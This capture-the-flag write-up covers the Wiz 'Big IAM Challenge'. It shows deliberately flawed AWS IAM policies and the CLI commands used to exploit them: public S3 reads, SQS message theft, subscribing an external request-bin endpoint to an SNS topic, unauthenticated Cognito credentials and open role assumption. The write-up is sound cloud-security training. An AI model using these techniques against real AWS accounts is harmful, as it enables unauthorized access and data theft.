# CTF Report: Big IAM Challenge
## Overview
In this report, I document my approach to solving the **Big IAM Challenge**, a series of AWS-based challenges that focus on various aspects of IAM, permissions, and exploitation in the AWS cloud environment. These challenges are part of the Wiz CTF event, which emphasizes real-world scenarios in cloud security.

### Challenge 1: Buckets of Fun

#### Objective:

The first challenge revolves around identifying the exposed storage in a public S3 bucket. The goal is to extract the flag from the publicly accessible S3 bucket.

#### Steps Taken:

1. **IAM Policy Analysis:**
   - The IAM policy reveals public access to the S3 bucket. The relevant statements indicate the following:
     - `s3:GetObject` permission is granted to all users on the objects inside the bucket `arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*`.
     - `s3:ListBucket` permission allows listing the contents of the `files/` prefix inside the bucket.

   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Effect": "Allow",
         "Principal": "*",
         "Action": "s3:GetObject",
         "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
       },
       {
         "Effect": "Allow",
         "Principal": "*",
         "Action": "s3:ListBucket",
         "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
         "Condition": {
           "StringLike": {
             "s3:prefix": "files/*"
           }
         }
       }
     ]
   }
   ```

2. **Listing Bucket Contents:**
   - I used the `aws s3 ls` command to list the contents of the `thebigiamchallenge-storage-9979f4b` bucket.
   - The output shows a `files/` folder containing the file `flag1.txt`.

   ```bash
   aws s3 ls thebigiamchallenge-storage-9979f4b
   PRE files/
   aws s3 ls thebigiamchallenge-storage-9979f4b/files/
   2023-06-05 19:13:53         37 flag1.txt
   ```

3. **Downloading the Flag:**
   - I downloaded `flag1.txt` from the bucket using the `aws s3 cp` command.

   ```bash
   aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/flag1.txt
   ```

4. **Flag Extraction:**
   - Upon opening the downloaded `flag1.txt`, I found the following flag:

   ```
   {wiz:exposed-storage-risky-as-usual}
   ```

---

### Challenge 2: IAM Big Challenge

#### Objective:

This challenge revolves around exploiting an AWS SQS (Simple Queue Service) to retrieve the secret flag. The permissions on the SQS allow both `SendMessage` and `ReceiveMessage` actions from any principal.

#### Steps Taken:

1. **IAM Policy Analysis:**
   - The policy grants access to the SQS queue for both `SendMessage` and `ReceiveMessage` actions for all users.

   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Effect": "Allow",
         "Principal": "*",
         "Action": [
           "sqs:SendMessage",
           "sqs:ReceiveMessage"
         ],
         "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
       }
     ]
   }
   ```

2. **Receiving a Message from SQS:**
   - I used the AWS CLI to receive messages from the queue. The output included a message with a URL to an S3 bucket.

   ```bash
   aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
   ```

   The message body revealed a URL to a file in an S3 bucket:

   ```json
   {
     "URL": "https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html",
     "User-Agent": "Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714",
     "IsAdmin": true
   }
   ```

3. **Accessing the Flag:**
   - I used `curl` to access the provided URL, which led to the following flag:

   ```
   {wiz:you-are-at-the-front-of-the-queue}
   ```

---

### Challenge 3: Enable Push Notifications

#### Objective:

The challenge involves subscribing to an SNS (Simple Notification Service) topic to receive push notifications. The IAM policy restricts subscriptions to endpoints with the domain `@tbic.wiz.io`.

#### Steps Taken:

1. **IAM Policy Analysis:**
   - The policy allows any user to subscribe to the SNS topic as long as the endpoint is of the form `@tbic.wiz.io`.

   ```json
   {
     "Version": "2008-10-17",
     "Id": "Statement1",
     "Statement": [
       {
         "Sid": "Statement1",
         "Effect": "Allow",
         "Principal": {
           "AWS": "*"
         },
         "Action": "SNS:Subscribe",
         "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
         "Condition": {
           "StringLike": {
             "sns:Endpoint": "*@tbic.wiz.io"
           }
         }
       }
     ]
   }
   ```

2. **Subscribing to the SNS Topic:**
   - I subscribed to the SNS topic using a custom endpoint (`https://eoz7q6sn8xygiyy.m.pipedream.net/@tbic.wiz.io`), which meets the domain requirement.

   ```bash
   aws sns subscribe --topic-arn "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications" --protocol https --notification-endpoint https://eoz7q6sn8xygiyy.m.pipedream.net/@tbic.wiz.io
   ```

   The response showed that the subscription was pending confirmation.

3. **Confirming the Subscription:**
   - I received a subscription confirmation message via the request bin, which included a `SubscribeURL`.

   ```json
   {
     "Message": "You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.",
     "SubscribeURL": "https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a5875c3b40d43a87e57bf4cf2ded38a3d452f550e8081f1a405d1034eaa65ab868ffb28a01544c874c441e9dd1d670b947e0c814cf06430805cafd41f4f210e9b32cbfcca69f349f61197dbc47f758746c001f8261091d866529fe02fc127def2b3b80d19c73b590b91fd1d7259544f096f"
   }
   ```

4. **Visiting the Confirm Subscription URL:**
   - After confirming the subscription, I received a confirmation response containing the `SubscriptionArn`:

   ```xml
   <ConfirmSubscriptionResponse xmlns="http://sns.amazonaws.com/doc/2010-03-31/">
     <ConfirmSubscriptionResult>
       <SubscriptionArn>arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:7e284ae3-0fd6-4cc5-95e6-1a033974d5d9</SubscriptionArn>
     </ConfirmSubscriptionResult>
   </ConfirmSubscriptionResponse>
   ```
---

## Challenge C4: Admin only?

**Challenge Value:** 10 points  
**Description:**  
The bucket appears to restrict access to a specific admin IAM user, but a misconfiguration allows public access.

### IAM Policy:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

### Exploitation:
- Listing and accessing files via curl and AWS CLI is possible without authentication.
- The bucket exposes files publicly despite restrictions.

**Flag:** `{wiz:principal-arn-is-not-what-you-think}`

---

## Challenge C5: Do I know you?

**Challenge Value:** 10 points  
**Description:**  
AWS Cognito was used as the identity provider. The credentials were obtained via Cognito APIs and used to generate a signed URL.

### IAM Policy:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

### Steps:
1. Found IdentityPoolId in source code.
2. Used AWS CLI to get identity ID and credentials:
```bash
aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
aws cognito-identity get-credentials-for-identity --identity-id "<returned-id>"
```
3. Used the temporary credentials to generate a signed URL for S3 access.

---

## Challenge C6: Assume breach

**Challenge Value:** 10 points  
**Description:**  
IAM role trust relationship allows arbitrary users to assume a role because of a misconfigured trust policy.

### Exploitation:
```bash
aws sts assume-role --role-arn arn:aws:iam::756243157448:role/s3-readonly-role --role-session-name demo
```

- Successfully assumed the role and received temporary credentials.
- Used those credentials to access S3:
```bash
aws s3 cp s3://wiz-openbucket/flag.txt . --region us-east-1
```

**Flag:** `{wiz:assume-role-is-the-best}`

---

## Conclusion

The Big IAM Challenge involved a series of real-world scenarios related to AWS security services. By analyzing IAM policies, exploiting misconfigurations, and interacting with various AWS resources like S3, SQS, and SNS, I was able to successfully extract the flags and complete the challenges.
This experience enhanced my understanding of cloud security, particularly in the context of AWS IAM, S3, SQS, and SNS. It also reinforced the importance of careful policy configuration to prevent unauthorized access to sensitive resources.
